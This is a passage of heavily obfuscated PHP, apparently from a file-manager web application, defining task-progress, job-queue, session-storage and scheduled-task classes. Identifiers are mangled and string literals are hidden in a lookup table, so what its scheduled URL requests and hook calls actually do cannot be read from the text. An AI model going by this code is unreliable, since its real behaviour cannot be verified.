$this->update($çÜÉÌÜÔ); $this->sourceModelCopyFlag = !1; } public function sourceMove($Ó¸ÛÍ¡Ÿ) { $this->sourceRemove($Ó¸ÛÍ¡Ÿ, !1); } public function curlProgress($¸©ÛÉ¼ş, $œúÑ‹ØÜ, $Çá»ËŸ, $ª¢åº¯î, $¾‰Áìß) { $öÕä»ü =& $_SERVER[¥ÙÌÜ¾ê]; $ç–â¶Ÿƒ =& $this->task; if ($¾‰Áìß > 0) { $ç–â¶Ÿƒ[$öÕä»ü[1061]] = $öÕä»ü[1647]; $ç–â¶Ÿƒ[$öÕä»ü[1630]] = $öÕä»ü[107]; if ($ç–â¶Ÿƒ[$öÕä»ü[1628]]) { $ç–â¶Ÿƒ[$öÕä»ü[1629]] = $¾‰Áìß; } if ($ç–â¶Ÿƒ[$öÕä»ü[1631]]) { $ç–â¶Ÿƒ[$öÕä»ü[1629]] = $¾‰Áìß + $ç–â¶Ÿƒ[$öÕä»ü[1631]]; } } else { if ($Çá»ËŸ > 0) { if ($ç–â¶Ÿƒ[$öÕä»ü[1628]] == $œúÑ‹ØÜ) { $ç–â¶Ÿƒ[$öÕä»ü[1629]] = $Çá»ËŸ; $ç–â¶Ÿƒ[$öÕä»ü[1061]] = $öÕä»ü[1648]; $ç–â¶Ÿƒ[$öÕä»ü[1630]] = $öÕä»ü[1129]; } } } $this->update(); } public function curlProgressStart($Ü¶«µÃ) { } public function curlProgressEnd($Úƒíå¨) { $ÚÂÏÚÜ =& $_SERVER[¥ÙÌÜ¾ê]; $šéö£š =& $this->task; $®ÙÆì¬Ê = curl_getinfo($Úƒíå¨); $ó°ùÙ¨È = $®ÙÆì¬Ê[$ÚÂÏÚÜ[1649]]; if ($ó°ùÙ¨È == -1) { $ó°ùÙ¨È = $®ÙÆì¬Ê[$ÚÂÏÚÜ[1650]]; } if ($šéö£š[$ÚÂÏÚÜ[1630]] == $ÚÂÏÚÜ[107] && $ó°ùÙ¨È) { $šéö£š[$ÚÂÏÚÜ[1631]] += $ó°ùÙ¨È; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $‘ ¦­®À =& $_SERVER[¥ÙÌÜ¾ê]; $¢Ùí±Ã =& $this->task; $¢Ùí±Ã[$‘ ¦­®À[1651]] = 1; Hook::bind($‘ ¦­®À[1620], array($this, $‘ ¦­®À[1652])); Hook::bind($‘ ¦­®À[1622], array($this, $‘ ¦­®À[1653])); Hook::bind($‘ ¦­®À[1624], array($this, $‘ ¦­®À[1654])); } protected function endAfter() { $Ò¤†ŸÙ =& $_SERVER[¥ÙÌÜ¾ê]; Hook::unbind($Ò¤†ŸÙ[1620], array($this, $Ò¤†ŸÙ[1652])); Hook::unbind($Ò¤†ŸÙ[1622], array($this, $Ò¤†ŸÙ[1653])); Hook::unbind($Ò¤†ŸÙ[1624], array($this, $Ò¤†ŸÙ[1654])); } public function progressStart($ä‚Š›Ò§) { $¾ô±¡À =& $_SERVER[¥ÙÌÜ¾ê]; $ŠéÂôúş = curl_getinfo($ä‚Š›Ò§); self::log($¾ô±¡À[1655] . $ŠéÂôúş[$¾ô±¡À[305]]); self::valueSet($this->task[$¾ô±¡À[395]], $this->task); } public function progressEnd($¨—ŒÆĞ) { $×ïÁ©·Ÿ =& $_SERVER[¥ÙÌÜ¾ê]; self::log($×ïÁ©·Ÿ[1656] . $this->task[$×ïÁ©·Ÿ[395]]); $this->end(); } public function progress($Óƒ·¥“š, $¿ƒş­µµ, $ÚæÀÀº¼, $¦½™­·Ö, $Òƒ÷ùä–) { $´Äááê =& $_SERVER[¥ÙÌÜ¾ê]; $Å–›§ã =& $this->task; if ($Òƒ÷ùä– > 0) { $Å–›§ã[$´Äááê[1059]] = $Å–›§ã[$´Äááê[1059]] == 0 ? $¦½™­·Ö : $Å–›§ã[$´Äááê[1059]]; $Å–›§ã[$´Äááê[1582]] = $Òƒ÷ùä–; } else { if ($ÚæÀÀº¼ > 0) { $Å–›§ã[$´Äááê[1059]] = $Å–›§ã[$´Äááê[1059]] == 0 ? $¿ƒş­µµ : $Å–›§ã[$´Äááê[1059]]; $Å–›§ã[$´Äááê[1582]] = $ÚæÀÀº¼; } } $this->update(); self::log("\x70\162\157\x67\x72\x65\x73\163\110\x74\x74\160\72\x64\x6f\167\156\x3a{$ÚæÀÀº¼}\57{$¿ƒş­µµ}\x3b\x20\x75\x70\154\x6f\x61\144\x3a{$Òƒ÷ùä–}\57{$¦½™­·Ö}\x3b"); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\x61\x73\x6b\121\165\x65\165\145\x4c\x65\x6e\147\x74\x68"; const QUEUE_DATA = "\x74\x61\x73\x6b\121\165\145\x75\x65\x44\x61\x74\x61"; public static $listData = false; public static function initTask() { } public static function add($ÊÀÜ®«È, $üù€»Â‘ = array(), $šòÇ†ƒò = '', $ï­Êö£Ã = '') { $ò©Çˆ²¾ =& $_SERVER[¥ÙÌÜ¾ê]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($ï­Êö£Ã && array_find_by_field(self::$listData, $ò©Çˆ²¾[93], $ï­Êö£Ã)) { return !0; } self::$listData[] = array($ò©Çˆ²¾[262] => $ÊÀÜ®«È, $ò©Çˆ²¾[1657] => $üù€»Â‘, $ò©Çˆ²¾[445] => $šòÇ†ƒò, $ò©Çˆ²¾[93] => $ï­Êö£Ã); return !0; } public static function addSubmit() { $¾ÌÈ»ŒØ =& $_SERVER[¥ÙÌÜ¾ê]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($¾ÌÈ»ŒØ[1658] . json_encode_force(array_to_keyvalue(self::$listData, $¾ÌÈ»ŒØ[33], $¾ÌÈ»ŒØ[445])), $¾ÌÈ»ŒØ[1659]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($†å™‘É, $»ª†Ğ¾• = array(), $óÅÛ¹ò = '', $¸éÑãöÇ = '') { $áÌ¾úˆİ =& $_SERVER[¥ÙÌÜ¾ê]; if (self::count() >= self::MAX_LENGTH) { return !1; } $ûùü¥ô¥ = self::getAll(); if ($¸éÑãöÇ && array_find_by_field($ûùü¥ô¥, $áÌ¾úˆİ[93], $¸éÑãöÇ)) { return !0; } $ûùü¥ô¥[] = array($áÌ¾úˆİ[262] => $†å™‘É, $áÌ¾úˆİ[1657] => $»ª†Ğ¾•, $áÌ¾úˆİ[445] => $óÅÛ¹ò, $áÌ¾úˆİ[93] => $¸éÑãöÇ); write_log($áÌ¾úˆİ[1658] . $óÅÛ¹ò, $áÌ¾úˆİ[1659]); self::setAll($ûùü¥ô¥); return !0; } public static function run() { $ºŒ£¼à· =& $_SERVER[¥ÙÌÜ¾ê]; $÷óÈÚ²Á = self::getAll(); $¥…ó¿Ø´ = array_shift($÷óÈÚ²Á); if (!$¥…ó¿Ø´) { return !1; } self::setAll($÷óÈÚ²Á); $ £Ï†´å = timeFloat(); try { Hook::apply($¥…ó¿Ø´[$ºŒ£¼à·[262]], $¥…ó¿Ø´[$ºŒ£¼à·[1657]]); } catch (Exception $Ñ‹š¦µÌ) { } $ì»¢“™ë = number_format(timeFloat() - $ £Ï†´å, 3) . $ºŒ£¼à·[1595]; write_log($ºŒ£¼à·[1660] . $¥…ó¿Ø´[$ºŒ£¼à·[445]] . $ºŒ£¼à·[1661] . $ì»¢“™ë, $ºŒ£¼à·[1659]); return !0; } public static function count() { $Î¶Ï§´ß = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$Î¶Ï§´ß) { return 0; } return intval($Î¶Ï§´ß); } public static function getAll() { $²àßñ¾÷ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$²àßñ¾÷) { return array(); } return $²àßñ¾÷; } public static function setAll($èÇÒÒÎ) { $¬´İıÅ± = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($èÇÒÒÎ), $¬´İıÅ±); Cache::set(self::QUEUE_DATA, $èÇÒÒÎ, $¬´İıÅ±); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } goto bˆëÑÀë; D¹óš—À‡‘: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $ĞäÎË­ =& $_SERVER[¥ÙÌÜ¾ê]; static $…ó‹éï  = false; if ($…ó‹éï ) { return $…ó‹éï ; } $ãİëÖÆû = $GLOBALS[$ĞäÎË­[6]][$ĞäÎË­[347]]; self::$sessionTime = $ãİëÖÆû[$ĞäÎË­[1537]]; $Éİ˜¡Èä = isset($GLOBALS[$ĞäÎË­[1538]]) ? $GLOBALS[$ĞäÎË­[1538]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($Éİ˜¡Èä)) { self::$sessionSign = Cookie::get($Éİ˜¡Èä); } else { self::$sessionSign = guid(); } } Cookie::setSafe($Éİ˜¡Èä, self::$sessionSign, self::$sessionTime); $‰ìÄ“ïò = $ãİëÖÆû[$ĞäÎË­[1539]]; $ı‘Ê…çÕ = $ãİëÖÆû[$‰ìÄ“ïò]; $¦ äÑ£ğ = $ãİëÖÆû[$ĞäÎË­[828]]; switch ($‰ìÄ“ïò) { case $ĞäÎË­[17]: self::$handle = Model($ĞäÎË­[829]); break; case $ĞäÎË­[830]: self::$handle = new CacheRedis($ı‘Ê…çÕ, $¦ äÑ£ğ); break; case $ĞäÎË­[831]: self::$handle = new CacheMemcached($ı‘Ê…çÕ, $¦ äÑ£ğ); break; case $ĞäÎË­[193]: $ı‘Ê…çÕ[$ĞäÎË­[76]] = $ı‘Ê…çÕ[$ĞäÎË­[76]] . $ĞäÎË­[1540]; self::$handle = new CacheFile($ı‘Ê…çÕ, $¦ äÑ£ğ); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $…ó‹éï  = new self(); return $…ó‹éï ; } public static function getBySign($íŠõ…¬) { CacheLock::lock($íŠõ…¬); $®ıò¹‚ = self::$handle->get($íŠõ…¬); CacheLock::unlock($íŠõ…¬); $®ıò¹‚ = unserialize($®ıò¹‚); return is_array($®ıò¹‚) ? $®ıò¹‚ : array(); } public static function setBySign($§ƒ”ÖŠ±, $«ÔıØ°) { CacheLock::lock($§ƒ”ÖŠ±); self::$handle->set($§ƒ”ÖŠ±, serialize($«ÔıØ°), self::$sessionTime); CacheLock::unlock($§ƒ”ÖŠ±); } public static function sign($şË‹ŒĞŒ = false) { $şË‹ŒĞŒ && (self::$sessionSign = $şË‹ŒĞŒ); self::init(); return self::$sessionSign; } public static function set($¾ëó—‹Ú, $„¡’¢åŒ = false) { self::init(); if (is_array($¾ëó—‹Ú)) { foreach ($¾ëó—‹Ú as $º’úÜ¨ => $“á¡ßøø) { array_set_value(self::$data, $º’úÜ¨, $“á¡ßøø); } } else { array_set_value(self::$data, $¾ëó—‹Ú, $„¡’¢åŒ); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ˆšõÙ„ = false) { self::init(); if (!$ˆšõÙ„) { return self::$data; } return array_get_value(self::$data, $ˆšõÙ„); } public static function remove($¹‚òâ¨¸) { self::init(); unset(self::$data[$¹‚òâ¨¸]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[¥ÙÌÜ¾ê][833])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $úØ¨ÛŒ¬ =& $_SERVER[¥ÙÌÜ¾ê]; if (self::valueGet($úØ¨ÛŒ¬[743]) != $úØ¨ÛŒ¬[87]) { return; } if (self::valueGet($úØ¨ÛŒ¬[1541]) == $úØ¨ÛŒ¬[87]) { $¨¾èíŒı = self::valueGet($úØ¨ÛŒ¬[1542]); if (time() - $¨¾èíŒı > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); self::valueSet($úØ¨ÛŒ¬[1541], $úØ¨ÛŒ¬[87]); self::log($úØ¨ÛŒ¬[1543]); Hook::bind($úØ¨ÛŒ¬[1544], $úØ¨ÛŒ¬[1545]); $¯´áé– = 0; while (!0) { self::cacheClear(); if (self::valueGet($úØ¨ÛŒ¬[743]) != $úØ¨ÛŒ¬[87]) { self::valueSet($úØ¨ÛŒ¬[1541], $úØ¨ÛŒ¬[191]); self::log($úØ¨ÛŒ¬[1546]); die; } $ÈğÌ¦„­ = time(); if ($ÈğÌ¦„­ - $¯´áé– >= 60) { self::valueSet(array($úØ¨ÛŒ¬[1541] => $úØ¨ÛŒ¬[87], $úØ¨ÛŒ¬[1542] => $ÈğÌ¦„­), !1); $¯´áé– = $ÈğÌ¦„­; } if (!file_exists(USER_SYSTEM . $úØ¨ÛŒ¬[1547])) { self::valueSet(array($úØ¨ÛŒ¬[1541] => $úØ¨ÛŒ¬[191], $úØ¨ÛŒ¬[743] => $úØ¨ÛŒ¬[191]), !1); self::log($úØ¨ÛŒ¬[1548]); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $ƒ×ÚèÙó =& $_SERVER[¥ÙÌÜ¾ê]; http_close(); self::valueSet($ƒ×ÚèÙó[743], $ƒ×ÚèÙó[191]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ƒ×ÚèÙó[1541] => $ƒ×ÚèÙó[191], $ƒ×ÚèÙó[743] => $ƒ×ÚèÙó[87]), !1); } public static function shutdownEvent() { $Øßª±ç¼ =& $_SERVER[¥ÙÌÜ¾ê]; self::valueSet($Øßª±ç¼[1541], $Øßª±ç¼[191]); self::log($Øßª±ç¼[1549]); } public static function config($³ü›â–, $âÚİÂ¯) { self::valueSet($_SERVER[¥ÙÌÜ¾ê][743], $³ü›â–); } private static function taskRunAll() { $ñ×±ùï¥ =& $_SERVER[¥ÙÌÜ¾ê]; $‹ğ˜Ãî£ = timeFloat(); $‚„¨¿´º = Model($ñ×±ùï¥[1550])->listData(); $ìà÷öà¾ = count($‚„¨¿´º); for ($õää³¹ = 0; $õää³¹ < $ìà÷öà¾; $õää³¹++) { $íÁÒ… = $‚„¨¿´º[$õää³¹]; if (!$íÁÒ…[$ñ×±ùï¥[395]] || $íÁÒ…[$ñ×±ùï¥[1551]] != $ñ×±ùï¥[87]) { continue; } if (!self::taskTimeCheck($íÁÒ…)) { continue; } self::taskRun($íÁÒ…); } Hook::trigger($ñ×±ùï¥[1552]); self::taskQueueRun($‹ğ˜Ãî£); } private static function taskQueueRun($¶Ü½”ş”) { $ÙÍ‡½ = 10; while (!0) { $˜ñï™¹ñ = TaskQueue::run(); if ($˜ñï™¹ñ === !1) { break; } if (timeFloat() - $¶Ü½”ş” >= $ÙÍ‡½) { break; } } } private static function taskTimeCheck($É˜‰İ—’) { $î‹•à¯ =& $_SERVER[¥ÙÌÜ¾ê]; $ô«§ºÂˆ = json_decode($É˜‰İ—’[$î‹•à¯[197]], !0); $¼Àì²è = intval($É˜‰İ—’[$î‹•à¯[1542]]); $°Ã£ı—ˆ = strtotime($î‹•à¯[1553] . $ô«§ºÂˆ[$î‹•à¯[1554]] . $î‹•à¯[1555]) - strtotime($î‹•à¯[1556]); $¶åîŒã¹ = time() - strtotime(date($î‹•à¯[1557]) . $î‹•à¯[1558]); $ı£òÆóÁ = $¶åîŒã¹ >= $°Ã£ı—ˆ && $¶åîŒã¹ <= $°Ã£ı—ˆ + 3600; switch ($ô«§ºÂˆ[$î‹•à¯[29]]) { case $î‹•à¯[1559]: if (time() - $¼Àì²è < 3600 * 24 * 30) { return !1; } if ($ô«§ºÂˆ[$î‹•à¯[1559]] == date($î‹•à¯[1560]) && $ı£òÆóÁ) { return !0; } break; case $î‹•à¯[1561]: if (time() - $¼Àì²è < 3600 * 24 * 7) { return !1; } $ø²¢°¿Í = date($î‹•à¯[1562]) == 0 ? 7 : date($î‹•à¯[1562]); if ($ô«§ºÂˆ[$î‹•à¯[1561]] == $ø²¢°¿Í && $ı£òÆóÁ) { return !0; } break; case $î‹•à¯[1554]: if (time() - $¼Àì²è < 3600 * 24) { return !1; } if ($ı£òÆóÁ) { return !0; } break; case $î‹•à¯[1563]: if (time() - $¼Àì²è >= floatval($ô«§ºÂˆ[$î‹•à¯[1563]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $ÅæàÂœ¶ =& $_SERVER[¥ÙÌÜ¾ê]; static $ëñ·¼¾ = 0; $¢úÃ¹ß˜ = 300; if (!$ëñ·¼¾) { $ëñ·¼¾ = time(); } if (time() - $ëñ·¼¾ < $¢úÃ¹ß˜) { return; } $ëñ·¼¾ = time(); $–®µ¤û = Model($ÅæàÂœ¶[507])->db($ÅæàÂœ¶[33]); if ($–®µ¤û) { $–®µ¤û->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($ÅæàÂœ¶[1564], $ÅæàÂœ¶[1565]); die; } } public static function taskRun($¦Òß‘ëè) { $Í—ÒµÎ =& $_SERVER[¥ÙÌÜ¾ê]; self::log($Í—ÒµÎ[1566] . $¦Òß‘ëè[$Í—ÒµÎ[395]] . $Í—ÒµÎ[1567] . $¦Òß‘ëè[$Í—ÒµÎ[28]] . $Í—ÒµÎ[1568] . $¦Òß‘ëè[$Í—ÒµÎ[1569]]); Model($Í—ÒµÎ[1550])->run($¦Òß‘ëè[$Í—ÒµÎ[395]]); $‘©õš Ã = timeFloat(); $ÒÂ–ÊŸ— = $Í—ÒµÎ[33]; switch ($¦Òß‘ëè[$Í—ÒµÎ[29]]) { case $Í—ÒµÎ[305]: $‚Íõ«¯ = url_request($¦Òß‘ëè[$Í—ÒµÎ[1569]], $Í—ÒµÎ[228], !1, !1, !1, !1, 10); if ($‚Íõ«¯[$Í—ÒµÎ[743]]) { $ÒÂ–ÊŸ— = strlen($‚Íõ«¯[$Í—ÒµÎ[1123]]); } break; case $Í—ÒµÎ[227]: $ÒÂ–ÊŸ— = Hook::apply($¦Òß‘ëè[$Í—ÒµÎ[1569]]); default: break; } Model($Í—ÒµÎ[1570])->add(array($Í—ÒµÎ[1571] => $Í—ÒµÎ[33], $Í—ÒµÎ[1572] => $Í—ÒµÎ[191], $Í—ÒµÎ[29] => $Í—ÒµÎ[1573] . $¦Òß‘ëè[$Í—ÒµÎ[395]], $Í—ÒµÎ[1574] => json_encode(array($Í—ÒµÎ[28] => $¦Òß‘ëè[$Í—ÒµÎ[28]], $Í—ÒµÎ[1575] => timeFloat() - $‘©õš Ã, $Í—ÒµÎ[291] => $ÒÂ–ÊŸ—)))); $×½Ï–‰  = $ÒÂ–ÊŸ— ? $Í—ÒµÎ[1576] . $ÒÂ–ÊŸ— : $Í—ÒµÎ[33]; self::log($Í—ÒµÎ[1577] . $¦Òß‘ëè[$Í—ÒµÎ[395]] . $Í—ÒµÎ[530] . $×½Ï–‰ ); return !0; } private static function valueGet($•Ë×™ôç) { $´Âç¹ó¥ =& $_SERVER[¥ÙÌÜ¾ê]; $Ï†ºÙ¬ = $´Âç¹ó¥[1578]; $¯ÑÏ×óé = Model($´Âç¹ó¥[427])->get($•Ë×™ôç, $Ï†ºÙ¬); if (is_null($¯ÑÏ×óé)) { Model($´Âç¹ó¥[427])->set($´Âç¹ó¥[743], $´Âç¹ó¥[87], $Ï†ºÙ¬); Model($´Âç¹ó¥[427])->set($´Âç¹ó¥[1541], $´Âç¹ó¥[191], $Ï†ºÙ¬); $¯ÑÏ×óé = Model($´Âç¹ó¥[427])->get($•Ë×™ôç, $Ï†ºÙ¬); } return $¯ÑÏ×óé; } private static function valueSet($ò£Îí‹‡, $ˆ“èöñ) { $™‹úƒ§é =& $_SERVER[¥ÙÌÜ¾ê]; $ì¢ĞéŸŸ = $™‹úƒ§é[1579]; CacheLock::lock($ì¢ĞéŸŸ); $Ë¾ŠıõÌ = Model($™‹úƒ§é[427])->set($ò£Îí‹‡, $ˆ“èöñ, $™‹úƒ§é[1578]); CacheLock::unlock($ì¢ĞéŸŸ); return $Ë¾ŠıõÌ; } protected static function log($ö·ä·õ) { write_log($ö·ä·õ, $_SERVER[¥ÙÌÜ¾ê][1565]); } private static function cacheClear() { $”šŠÌ³é =& $_SERVER[¥ÙÌÜ¾ê]; Cache::clearMemory(Model($”šŠÌ³é[427])->cacheKey($”šŠÌ³é[1578])); Cache::clearMemory(Model($”šŠÌ³é[427])->cacheKey($”šŠÌ³é[1580])); Model($”šŠÌ³é[1550])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\x74\x6f\160"; const STATYS_RUNNING = "\162\165\x6e\156\151\x6e\x67"; const STATYS_KILL = "\x6b\x69\154\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($Ô¼•¶£›, $ç½—€Œ§ = '', $ÜË»â˜» = 0, $Ëî±Òıı = '') { $ıæ ÀÆş =& $_SERVER[¥ÙÌÜ¾ê]; if (self::get($Ô¼•¶£›)) { return; } $this->task = array($ıæ ÀÆş[395] => $Ô¼•¶£›, $ıæ ÀÆş[1581] => USER_ID, $ıæ ÀÆş[1481] => $Ëî±Òıı, $ıæ ÀÆş[29] => $ç½—€Œ§, $ıæ ÀÆş[1061] => $ıæ ÀÆş[33], $ıæ ÀÆş[1059] => $ÜË»â˜», $ıæ ÀÆş[1582] => 0, $ıæ ÀÆş[1583] => 0, $ıæ ÀÆş[1584] => 0, $ıæ ÀÆş[782] => timeFloat(), $ıæ ÀÆş[781] => 0, $ıæ ÀÆş[1585] => 0, $ıæ ÀÆş[1586] => 0, $ıæ ÀÆş[1587] => 0, $ıæ ÀÆş[743] => $ıæ ÀÆş[1541]); $GLOBALS[$ıæ ÀÆş[1588]] = 1; Hook::bind($ıæ ÀÆş[1544], array($this, $ıæ ÀÆş[1589])); Hook::bind($ıæ ÀÆş[1590], array($this, $ıæ ÀÆş[1591])); $this->startAfter(); Hook::trigger($ıæ ÀÆş[1592], $this->task); $this->task[$ıæ ÀÆş[1585]] = timeFloat(); } public function end() { $ÏáäÌ³Ü =& $_SERVER[¥ÙÌÜ¾ê]; if (!$this->task) { return; } if ($this->task[$ÏáäÌ³Ü[1585]]) { self::valueSet($this->task[$ÏáäÌ³Ü[395]], !1); } $‹Åˆ¶¦¯ = timeFloat() - $this->task[$ÏáäÌ³Ü[782]]; self::log($ÏáäÌ³Ü[1593] . $this->task[$ÏáäÌ³Ü[395]] . $ÏáäÌ³Ü[1594] . $‹Åˆ¶¦¯ . $ÏáäÌ³Ü[1595]); Hook::unbind($ÏáäÌ³Ü[1544], array($this, $ÏáäÌ³Ü[1589])); Hook::unbind($ÏáäÌ³Ü[1590], array($this, $ÏáäÌ³Ü[1591])); $this->endAfter(); $this->task = !1; } public function update($…ÜçßÎÙ = 0, $Ö”êÀ­ = false) { $ï‘£Ø¬à =& $_SERVER[¥ÙÌÜ¾ê]; $ìµ ô‡¶ =& $this->task; if (!$ìµ ô‡¶) { return; } $ìµ ô‡¶[$ï‘£Ø¬à[1582]] += $…ÜçßÎÙ; $ìµ ô‡¶[$ï‘£Ø¬à[781]] = timeFloat(); if ($ìµ ô‡¶[$ï‘£Ø¬à[1059]]) { if ($ìµ ô‡¶[$ï‘£Ø¬à[1059]] < $ìµ ô‡¶[$ï‘£Ø¬à[1582]]) { $ìµ ô‡¶[$ï‘£Ø¬à[1059]] = $ìµ ô‡¶[$ï‘£Ø¬à[1582]]; } $à¶õ ”³ = timeFloat() - $ìµ ô‡¶[$ï‘£Ø¬à[782]] - $ìµ ô‡¶[$ï‘£Ø¬à[1586]]; $ìµ ô‡¶[$ï‘£Ø¬à[1583]] = $ìµ ô‡¶[$ï‘£Ø¬à[1582]] / $ìµ ô‡¶[$ï‘£Ø¬à[1059]]; $ìµ ô‡¶[$ï‘£Ø¬à[1584]] = $ìµ ô‡¶[$ï‘£Ø¬à[1582]] / $à¶õ ”³; if ($ìµ ô‡¶[$ï‘£Ø¬à[1583]] > 0) { $ìµ ô‡¶[$ï‘£Ø¬à[1587]] = $à¶õ ”³ * (1 - $ìµ ô‡¶[$ï‘£Ø¬à[1583]]) / $ìµ ô‡¶[$ï‘£Ø¬à[1583]]; } $ìµ ô‡¶[$ï‘£Ø¬à[1587]] = $ìµ ô‡¶[$ï‘£Ø¬à[1587]] <= 0 ? 0 : $ìµ ô‡¶[$ï‘£Ø¬à[1587]]; } $this->updateAfter(); $õÊ±ôª = 0.2; if (timeFloat() - $ìµ ô‡¶[$ï‘£Ø¬à[1585]] < $õÊ±ôª && !$Ö”êÀ­) { return; } $Ÿˆõš = self::get($ìµ ô‡¶[$ï‘£Ø¬à[395]]); $ÛÏï‚´ = $Ÿˆõš[$ï‘£Ø¬à[743]]; if ($ÛÏï‚´ == self::STATYS_KILL) { $ê ¬Ù ú = array($ï‘£Ø¬à[1596] => LNG($ï‘£Ø¬à[1597]), $ï‘£Ø¬à[1121] => !1); Cache::set($ï‘£Ø¬à[1598] . $this->task[$ï‘£Ø¬à[395]], $ê ¬Ù ú, 30); $this->onKill(); $this->end(); die; } else { if ($ÛÏï‚´ == self::STATYS_STOP) { $ÜÀÂÃûÏ = 2; $Ÿˆõš[$ï‘£Ø¬à[1586]] += $ÜÀÂÃûÏ; self::valueSet($ìµ ô‡¶[$ï‘£Ø¬à[395]], $Ÿˆõš); sleep($ÜÀÂÃûÏ); $this->update(); return; } } $ìµ ô‡¶[$ï‘£Ø¬à[743]] = $ÛÏï‚´ ? $ÛÏï‚´ : $ìµ ô‡¶[$ï‘£Ø¬à[743]]; $ìµ ô‡¶[$ï‘£Ø¬à[1586]] = $Ÿˆõš[$ï‘£Ø¬à[1586]] ? $Ÿˆõš[$ï‘£Ø¬à[1586]] : 0; $ìµ ô‡¶[$ï‘£Ø¬à[1585]] = timeFloat(); Hook::trigger($ï‘£Ø¬à[1599], $ìµ ô‡¶); self::valueSet($ìµ ô‡¶[$ï‘£Ø¬à[395]], $ìµ ô‡¶); } public function onKillSet($©Ç†£ğ©, $öî¥òı” = array()) { $this->onKillCall = array($©Ç†£ğ©, $öî¥òı”); } public function onKill() { $Í¡–Éà =& $_SERVER[¥ÙÌÜ¾ê]; self::log($Í¡–Éà[1593] . $this->task[$Í¡–Éà[395]] . $Í¡–Éà[1600]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($ÖÈÉ) { $’°™í°“ =& $_SERVER[¥ÙÌÜ¾ê]; Cache::set($’°™í°“[1598] . $this->task[$’°™í°“[395]], $ÖÈÉ, 60); return $ÖÈÉ; } public static function get($¿éûÚ¤á) { $µ›Ô¸…¥ =& $_SERVER[¥ÙÌÜ¾ê]; $ÓÇÒğ†ğ = self::valueGet($¿éûÚ¤á); if (is_array($ÓÇÒğ†ğ) && $ÓÇÒğ†ğ[$µ›Ô¸…¥[1601]]) { $’ÓêÙ¢‹ = ActionApply($ÓÇÒğ†ğ[$µ›Ô¸…¥[1601]], array($ÓÇÒğ†ğ)); $ÓÇÒğ†ğ = is_array($’ÓêÙ¢‹) ? $’ÓêÙ¢‹ : $ÓÇÒğ†ğ; } return $ÓÇÒğ†ğ; } public static function listData() { $«ãİ§û = self::valueGet(); return array_sort_by($«ãİ§û, $_SERVER[¥ÙÌÜ¾ê][782], !0); } public static function kill($¿Ò˜¡¤×) { return self::changeStatus($¿Ò˜¡¤×, self::STATYS_KILL); } public static function stop($İÈ“áÌˆ) { return self::changeStatus($İÈ“áÌˆ, self::STATYS_STOP); } public static function restart($€£ü˜åœ) { return self::changeStatus($€£ü˜åœ, self::STATYS_RUNNING); } public static function killAll() { $Öû„Áš¾ =& $_SERVER[¥ÙÌÜ¾ê]; $Öãı¹é› = self::listData(); foreach ($Öãı¹é› as $Š”›Şİ’) { self::kill($Š”›Şİ’[$Öû„Áš¾[395]]); } sleep(2); foreach ($Öãı¹é› as $Š”›Şİ’) { self::valueSet($Š”›Şİ’[$Öû„Áš¾[395]], !1); } } private static function changeStatus($Åè¥‚¥œ, $”Ë¾µŞ«) { $òãı»¹« =& $_SERVER[¥ÙÌÜ¾ê]; $¤µä¦Ô = self::valueGet($Åè¥‚¥œ); if (!$¤µä¦Ô) { return !1; } $¤µä¦Ô[$òãı»¹«[743]] = $”Ë¾µŞ«; self::valueSet($Åè¥‚¥œ, $¤µä¦Ô); self::log($òãı»¹«[1602] . $¤µä¦Ô[$òãı»¹«[395]] . $òãı»¹«[1603] . $”Ë¾µŞ«); return !0; } public static function valueGet($¦á«¿€ = false) { $çêòâÎÓ =& $_SERVER[¥ÙÌÜ¾ê]; if ($¦á«¿€) { $âÍ©öñµ = Model($çêòâÎÓ[439])->where(array($çêòâÎÓ[93] => $¦á«¿€, $çêòâÎÓ[29] => $çêòâÎÓ[1604]))->find(); return $âÍ©öñµ ? json_decode($âÍ©öñµ[$çêòâÎÓ[372]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ãìÑ¢­Ä = false) { $şƒø—ì =& $_SERVER[¥ÙÌÜ¾ê]; $Óªë¼‡ = array($şƒø—ì[29] => $şƒø—ì[1604]); if ($ãìÑ¢­Ä) { $Óªë¼‡[$şƒø—ì[1581]] = $ãìÑ¢­Ä; } $Øµõ±ò = Model($şƒø—ì[439])->where($Óªë¼‡)->select(); $Øµõ±ò = $Øµõ±ò ? $Øµõ±ò : array(); foreach ($Øµõ±ò as $Ò¡õ§øĞ => $šİ€Üİ) { $Øµõ±ò[$Ò¡õ§øĞ] = json_decode($šİ€Üİ[$şƒø—ì[372]], !0); } return 